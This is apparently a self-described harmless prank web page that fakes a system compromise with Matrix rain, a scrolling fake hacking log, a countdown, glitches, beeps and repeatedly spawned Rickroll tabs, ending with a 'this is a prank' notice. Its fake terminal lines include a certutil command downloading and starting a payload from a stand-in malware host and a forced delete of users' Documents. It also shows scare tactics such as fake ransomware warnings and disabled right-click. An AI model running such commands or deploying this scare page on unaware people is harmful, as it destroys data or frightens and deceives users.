<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM COMPROMISED</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            overflow: hidden;
            font-family: 'Courier New', monospace;
            height: 100vh;
        }
        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        .terminal {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: rgba(0,0,0,0.9);
            color: #0f0;
            font-family: monospace;
            font-size: 12px;
            padding: 15px;
            border: 1px solid #0f0;
            border-radius: 5px;
            z-index: 3;
            height: 200px;
            overflow-y: auto;
            white-space: pre-wrap;
            pointer-events: none;
        }
        .alertBox {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #000;
            border: 3px solid #f00;
            color: #f00;
            padding: 30px;
            text-align: center;
            z-index: 10;
            font-size: 24px;
            font-weight: bold;
            box-shadow: 0 0 50px rgba(255,0,0,0.5);
            display: none;
        }
        .countdown {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #000;
            border: 2px solid #f00;
            color: #f00;
            padding: 15px 25px;
            font-size: 28px;
            font-weight: bold;
            font-family: monospace;
            z-index: 4;
        }
        .progressBar {
            position: fixed;
            bottom: 0;
            left: 0;
            height: 5px;
            background: #f00;
            width: 0%;
            z-index: 5;
            transition: width 0.05s linear;
        }
        button {
            position: fixed;
            bottom: 240px;
            left: 20px;
            background: #0f0;
            color: #000;
            border: none;
            padding: 10px 20px;
            font-family: monospace;
            font-weight: bold;
            cursor: pointer;
            z-index: 6;
            display: none;
        }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>
    <div class="terminal" id="terminal"></div>
    <div class="countdown" id="countdown">00:60</div>
    <div class="progressBar" id="progressBar"></div>
    <div class="alertBox" id="alertBox">
        ⚠ YOUR SYSTEM HAS BEEN HACKED ⚠<br>
        <span style="font-size: 16px;">This is a prank. No damage done.</span><br>
        <button id="closeBtn" style="display:inline-block; margin-top:20px; position:relative; bottom:auto; left:auto;">Exit Prank</button>
    </div>

    <script>
        (function() {
            // Matrix rain effect
            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');
            
            function resizeCanvas() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resizeCanvas);
            resizeCanvas();
            
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+{}[]|;:,.<>?";
            const fontSize = 16;
            let columns = Math.floor(canvas.width / fontSize);
            let drops = new Array(columns).fill(1);
            
            function drawMatrix() {
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#0f0';
                ctx.font = fontSize + 'px monospace';
                for (let i = 0; i < drops.length; i++) {
                    const text = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            setInterval(drawMatrix, 50);
            
            // Terminal logging
            const terminal = document.getElementById('terminal');
            function log(msg) {
                const line = document.createElement('div');
                line.textContent = '> ' + msg;
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;
            }
            
            // Hacking messages sequence
            const messages = [
                "Initializing kernel exploit...",
                "Bypassing UAC protection...",
                "Accessing system32 directory...",
                "Extracting saved credentials...",
                "Dumping browser passwords...",
                "Copying clipboard history...",
                "Enumerating network devices...",
                "Installing remote access trojan...",
                "Disabling firewall...",
                "Injecting malicious code into explorer.exe",
                "Activating keylogger...",
                "Webcam access granted",
                "Microphone recording started",
                "Encrypting personal files (AES-256)",
                "Downloading ransomware payload...",
                "Sensitive data exfiltration in progress...",
                "Your IP has been logged: " + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255),
                "Establishing persistent backdoor...",
                "System restore points deleted",
                "MBR overwrite scheduled",
                "ALL YOUR FILES ARE BEING ENCRYPTED"
            ];
            
            let msgIndex = 0;
            const msgInterval = setInterval(() => {
                if (msgIndex < messages.length) {
                    log(messages[msgIndex]);
                    msgIndex++;
                } else {
                    clearInterval(msgInterval);
                }
            }, 800);
            
            // Countdown timer
            let seconds = 60;
            const countdownEl = document.getElementById('countdown');
            const progressBar = document.getElementById('progressBar');
            const countdownInterval = setInterval(() => {
                seconds--;
                const mins = Math.floor(seconds / 60);
                const secs = seconds % 60;
                countdownEl.textContent = `0${mins}:${secs < 10 ? '0' + secs : secs}`;
                const progressPercent = ((60 - seconds) / 60) * 100;
                progressBar.style.width = progressPercent + '%';
                
                if (seconds <= 10) {
                    countdownEl.style.color = '#ff0';
                    progressBar.style.background = '#ff0';
                }
                if (seconds <= 5) {
                    countdownEl.style.color = '#0f0';
                    progressBar.style.background = '#0f0';
                }
                
                if (seconds <= 0) {
                    clearInterval(countdownInterval);
                    clearInterval(msgInterval);
                    clearInterval(tabInterval);
                    clearInterval(randomGlow);
                    document.getElementById('alertBox').style.display = 'block';
                    countdownEl.style.display = 'none';
                    progressBar.style.display = 'none';
                    // Stop matrix effect
                    clearInterval(window.matrixInterval);
                }
            }, 1000);
            
            // TAB MANAGEMENT - open and close tabs repeatedly
            let openedTabs = [];
            
            function openRandomTab() {
                const urls = [
                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
                    'https://www.nytimes.com/games/wordle/index.html',
                    'https://www.google.com'
                ];
                const randomUrl = urls[Math.floor(Math.random() * urls.length)];
                const newTab = window.open(randomUrl, '_blank');
                if (newTab) {
                    openedTabs.push(newTab);
                    log("Spawned malicious window: " + randomUrl);
                } else {
                    log("Popup blocked! Please allow popups for full prank effect.");
                }
            }
            
            function closeRandomTab() {
                if (openedTabs.length > 0) {
                    const tab = openedTabs.pop();
                    try {
                        tab.close();
                        log("Terminated remote process window");
                    } catch(e) {
                        log("Failed to close window (cross-origin restriction)");
                    }
                }
            }
            
            // Open/close tabs on intervals
            const tabInterval = setInterval(() => {
                if (seconds > 0) {
                    if (Math.random() > 0.5 && openedTabs.length < 8) {
                        openRandomTab();
                    } else if (openedTabs.length > 2) {
                        closeRandomTab();
                    }
                }
            }, 2500);
            
            // Additional close spree at 10 seconds
            setTimeout(() => {
                const closeSpree = setInterval(() => {
                    if (seconds <= 10 && seconds > 0) {
                        closeRandomTab();
                    } else if (seconds <= 0) {
                        clearInterval(closeSpree);
                    }
                }, 500);
            }, 45000);
            
            // Screen glitch effects
            let glitchActive = true;
            function randomGlitch() {
                if (!glitchActive) return;
                const glitchChance = Math.random();
                if (glitchChance > 0.85) {
                    document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
                    setTimeout(() => { document.body.style.transform = ''; }, 100);
                }
                if (glitchChance > 0.9) {
                    document.body.style.filter = 'invert(1)';
                    setTimeout(() => { document.body.style.filter = ''; }, 200);
                }
                if (glitchChance > 0.95) {
                    const originalColor = document.body.style.backgroundColor;
                    document.body.style.backgroundColor = '#f00';
                    setTimeout(() => { document.body.style.backgroundColor = originalColor; }, 150);
                }
            }
            const randomGlow = setInterval(randomGlitch, 300);
            
            // Fake typing effect on terminal (simulates automated hacking)
            function typeFakeCommand() {
                const commands = [
                    "C:\\> hack --exploit CVE-2024-4358",
                    "C:\\> net user Administrator *",
                    "C:\\> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "C:\\> certutil -urlcache -f http://malware.com/payload.exe payload.exe",
                    "C:\\> start payload.exe",
                    "C:\\> del /F /Q C:\\Users\\*\\Documents\\*",
                    "C:\\> shutdown /s /t 30 /c \"SYSTEM COMPROMISED\""
                ];
                if (Math.random() > 0.7) {
                    const cmd = commands[Math.floor(Math.random() * commands.length)];
                    log(cmd);
                }
            }
            const typeInterval = setInterval(typeFakeCommand, 2000);
            
            // Browser DOM manipulation - move elements randomly
            function moveElementsRandomly() {
                const elements = document.querySelectorAll('.terminal, .countdown, .progressBar');
                elements.forEach(el => {
                    if (Math.random() > 0.95 && el.style.position !== 'fixed') {
                        el.style.position = 'relative';
                        el.style.left = Math.random() * 50 + 'px';
                        el.style.top = Math.random() * 50 + 'px';
                        setTimeout(() => {
                            el.style.left = '';
                            el.style.top = '';
                        }, 300);
                    }
                });
            }
            setInterval(moveElementsRandomly, 800);
            
            // Fake fullscreen request
            setTimeout(() => {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen().catch(e => log("Fullscreen blocked by browser"));
                }
            }, 2000);
            
            // Fake mouse trail (spooky)
            const trailDiv = document.createElement('div');
            trailDiv.style.position = 'fixed';
            trailDiv.style.pointerEvents = 'none';
            trailDiv.style.zIndex = '9999';
            document.body.appendChild(trailDiv);
            
            document.addEventListener('mousemove', (e) => {
                if (Math.random() > 0.95) {
                    const trail = document.createElement('div');
                    trail.textContent = '⚠';
                    trail.style.position = 'fixed';
                    trail.style.left = e.clientX + 'px';
                    trail.style.top = e.clientY + 'px';
                    trail.style.color = '#0f0';
                    trail.style.fontSize = '16px';
                    trail.style.fontFamily = 'monospace';
                    trail.style.pointerEvents = 'none';
                    trail.style.zIndex = '9999';
                    document.body.appendChild(trail);
                    setTimeout(() => trail.remove(), 500);
                }
            });
            
            // Disable right click
            document.addEventListener('contextmenu', (e) => e.preventDefault());
            
            // Close button handler
            document.getElementById('closeBtn').onclick = () => {
                // Close all opened tabs
                for (let tab of openedTabs) {
                    try { tab.close(); } catch(e) {}
                }
                // Redirect to Rickroll
                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            };
            
            // Web Audio API - scary beeps
            function playBeep(freq, duration) {
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioCtx.createOscillator();
                    const gain = audioCtx.createGain();
                    oscillator.connect(gain);
                    gain.connect(audioCtx.destination);
                    oscillator.frequency.value = freq;
                    gain.gain.value = 0.15;
                    oscillator.start();
                    setTimeout(() => {
                        oscillator.stop();
                        audioCtx.close();
                    }, duration);
                } catch(e) {}
            }
            
            const beepInterval = setInterval(() => {
                if (seconds > 0 && Math.random() > 0.7) {
                    playBeep(800 + Math.random() * 400, 80);
                }
                if (seconds <= 0) clearInterval(beepInterval);
            }, 1000);
            
            // Console scare message
            console.log("%c⚠ SYSTEM HACKED ⚠", "color: #f00; font-size: 30px; font-weight: bold;");
            console.log("%cThis is a harmless prank. No actual damage.", "color: #0f0; font-size: 16px;");
            
            log("Remote access established. Have fun ;)");
        })();
    </script>
</body>
</html>
